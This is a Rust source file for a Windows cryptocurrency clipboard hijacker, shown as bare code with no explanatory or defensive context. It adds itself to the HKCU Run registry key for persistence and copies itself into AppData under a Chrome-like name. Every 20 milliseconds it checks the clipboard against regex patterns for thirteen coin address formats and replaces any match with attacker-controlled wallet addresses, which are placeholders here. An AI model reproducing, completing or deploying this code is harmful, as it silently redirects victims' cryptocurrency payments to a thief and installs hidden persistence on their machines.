use clipboard::{
    ClipboardProvider,
    windows_clipboard::WindowsClipboardContext
};
use regex::Regex;
use std::{
    collections::HashMap,
    env,
    fs::{copy, create_dir_all},
    io,
    path::PathBuf,
    str::FromStr,
    thread,
    time::Duration,
};
use winreg::{enums::*, RegKey};

static MUTEX: &str = "adsdfs98f76sda98fysdf";
static FILE_NAME: &str = "chrome.txt";
static FOLDER_NAME: &str = "fsdljfsd";

const BTC_ADDR: &str = "h";
const XMR_ADDR: &str = "dfssdf";
const DGE_ADDR: &str = "dfssfd";
const LTC_ADDR: &str = "dsfsdf";
const ETH_ADDR: &str = "dfgdg";
const SHIBA_INU_ADDR: &str = "gfhdfh";
const RIPPLE_ADDR: &str = "fghfgh";
const SOLANA_ADDR: &str = "dfgsdfg";
const BINANCE_COIN_ADDR: &str = "sdfhsdf";
const TETHER_ADDR: &str = "fsdfsdf";
const DAI_ADDR: &str = "gfhghf";
const ETC_ADDR: &str = "ghgfhf";
const BCH_ADDR: &str = "ghgfh";

fn add_to_startup_registry(path: String) -> io::Result<()> {
    let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

    let key = RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey_with_flags(sub_key, KEY_WRITE)?;

    key.set_value(MUTEX, &path)
}

fn get_destination_path() -> (PathBuf, PathBuf) {
    let desired_path = PathBuf::from(
        env::var("LOCALAPPDATA").unwrap()
    ).join(FOLDER_NAME);
    
    (
        desired_path.join(format!("{}.exe", FILE_NAME)), 
        desired_path
    )
}

fn persistence() -> io::Result<()> {
    let current_path = env::current_exe()?;

    let (file_path, folder_path) = get_destination_path();

    match add_to_startup_registry(file_path.to_str().unwrap().to_string()) {
        Ok(..) => {
            create_dir_all(&folder_path)?;
            copy(current_path, file_path)?;
        }
        Err(..) => {}
    };

    Ok(())
}

fn scan(check_map: &HashMap<&str, &str>) -> bool {
    let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();

    let result = cb_prov.get_contents();

    let mut check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
        if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
            if let Ok(..) = cb_prov.set_contents(String::from(set)) {
                return Some(true);
            }
        }

        return None;
    };

    if let Ok(clipboard_text) = result {
        for (regex_str, address) in check_map {
            if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
                return true;
            }
        }
    }

    return false;
}

fn main() {
    let map: HashMap<&str, &str> = HashMap::from_iter([
        (r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$", BTC_ADDR),
        (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
        (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
        (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
        (r"^0x[0-9a-fA-F]{40}$", SHIBA_INU_ADDR),
        (r"^r[0-9a-zA-Z]{24,34}$", RIPPLE_ADDR),
        (r"^So[1-9A-HJ-NP-Za-km-z]{41,43}$", SOLANA_ADDR),
        (r"^0x[0-9a-fA-F]{40}$", BINANCE_COIN_ADDR),
        (r"^0x[0-9a-fA-F]{40}$", TETHER_ADDR),
        (r"^0x[0-9a-fA-F]{40}$", DAI_ADDR),
        (r"^0x[0-9a-fA-F]{40}$", ETC_ADDR),
        (r"^bitcoincash:q[0-9a-zA-Z]{41}$", BCH_ADDR),
    ]);
    
    match persistence() {
        Ok(..) => loop {
            scan(&map);
            thread::sleep(Duration::from_millis(20));
        },
        Err(..) => {}
    };
} 